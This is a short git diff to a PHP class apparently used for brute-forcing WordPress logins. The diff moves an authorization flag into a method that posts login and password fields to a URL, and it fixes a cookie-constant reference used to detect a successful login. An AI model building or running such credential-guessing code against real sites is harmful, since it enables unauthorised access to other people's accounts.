@@ -28,7 +28,6 @@ class Brute
         $login      = $this->loginCheck($data);
         $password   = $this->passwordCheck($data, $login);
         $iteration  = $this->checkIterator($data, $login, $password);
-        $authorized = false;
 
         if ($iteration == true) {
 
@@ -62,8 +61,9 @@ class Brute
             return $data['password'];
     }
 
-    public function handle($url, $login, $password) {
+    public function handle($url, $login, $password){
         $log = new Logger('name');
+        $authorized = false;
 
         $body = new FormBody;
         $body->addField('log', $login);
@@ -77,7 +77,7 @@ class Brute
         $cookies = $response->getHeaders()['set-cookie'];
 
         foreach ($cookies as $cookie) {
-            if (str_contains($cookie, WP_COOKIE_LOGIN))
+            if (str_contains($cookie, static::WP_COOKIE_LOGIN))
                 $authorized = true;
         }
 
